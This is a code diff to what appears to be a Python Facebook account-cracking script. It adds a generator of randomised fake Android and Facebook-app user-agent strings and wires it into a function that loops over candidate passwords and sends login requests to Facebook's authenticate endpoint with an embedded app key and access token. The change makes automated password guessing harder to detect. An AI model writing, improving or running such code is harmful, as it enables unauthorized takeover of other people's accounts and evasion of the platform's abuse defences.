@@ -343,6 +343,33 @@ def agefn():
     user_agentt = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4, 13)}; {random.choice(model2)} Build/TP1A.{random.randint(111111, 999999)}.{random.randint(111, 999)}) ' + agent
     return user_agentt
 
+#----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+def facebook_agent():
+    android_version = random.choice(['10', '11', '12'])
+    model = random.choice([
+        'Samsung Galaxy S21', 
+        'Google Pixel 5', 
+        'OnePlus 9', 
+        'Xiaomi Mi 11',
+        'LG V60 ThinQ', 
+        'Sony Xperia 1 II', 
+        'Huawei P40 Pro', 
+        'Motorola Edge+', 
+        'Nokia 8.3'
+    ])  # Add more models as needed
+
+    build_number = f"TP1A.{random.randint(111111, 999999)}.{random.randint(111, 999)}"
+    density = random.choice(['1.5', '2.0', '2.5', '3.0', '4.0'])
+    width = random.choice(['480', '720', '1080', '1440'])
+    height = random.choice(['800', '1280', '1920', '2560'])
+
+    agent = f'[FBAN/EMA;FBAV/{random.randint(81, 89)}.0.0.{random.randint(11, 99)};FBBV/{random.randint(31800000, 31999999)};FBDM/{{density={density},width={width},height={height}}};FBLC/en_US;FBCR/{random.choice(["Verizon", "AT&T", "T-Mobile"])};FBMF/{model.split(" ")[0]};FBBD/{model.split(" ")[0]};FBDV/{model};FBSV/{android_version};FBOP/1;FBCA/arm64-v8a:armeabi-v7a;]'
+
+    user_agent = f"Mozilla/5.0 (Linux; Android {android_version}; {model} Build/{build_number}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{random.randint(110, 120)}.0.0.0 Mobile Safari/537.36 {agent}"
+
+    return user_agent
+
 def mainx2():
 	mainx()
 ATOM="ATOM-"
@@ -1305,7 +1332,7 @@ def m5(idf,pwv):
     sys.stdout.flush()
     try:
       for pw in pwv:
-            useragent = str(sexua())
+            useragent = str(facebook_agent())
             warna = random.choice(my_color)
             data = {'adid':str(uuid.uuid4()),
             'format':'json',
@@ -1328,7 +1355,7 @@ def m5(idf,pwv):
             'fb_api_req_friendly_name':'authenticate',
             'api_key':'62f8ce9f74b12f84c123cc23437a4a32',
             'access_token':'350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
-            head = {'User-Agent': 'Mozilla/5.0 (Linux; Android 13; SM-N986B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 [FBAN/FB4A;FBAV/435.0.0.42.112;FBBV/523162189;FBDM/{density=2.625,width=1080,height=2123};FBLC/tr_TR;FBRV/525469090;FB_FW/2;FBCR/TM CELL;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N986B;FBSV/13;FBOP/1;FBCA/arm64-v8a:;]',
+            head = {'User-Agent': useragent,
             'Accept-Encoding':'gzip, deflate',
             'Connection':'close',
             'Content-Type':'application/x-www-form-urlencoded',
